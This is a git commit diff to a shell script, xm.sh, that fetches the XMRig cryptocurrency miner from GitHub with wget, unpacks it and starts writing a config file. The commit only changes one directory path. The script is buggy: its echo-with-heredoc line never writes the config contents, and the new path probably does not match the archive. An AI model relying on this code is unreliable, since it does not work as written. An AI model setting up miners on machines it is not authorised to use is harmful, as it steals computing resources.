321300eeb75f8473e900d83639e583bd611aa574
HOR32 <161935933+HOR32@users.noreply.github.com>
2026-08-06 17:32:04 +0200

    Add files via upload

--- xm.sh
+++ xm.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz
 tar -xf xmrig-6.26.0-linux-static-x64.tar.gz
-cd xmrig-6.26.0-linux-static-x64
+cd xmrig-6.26.0
 echo  > config.json << 'EOF'
 {
     "api": {
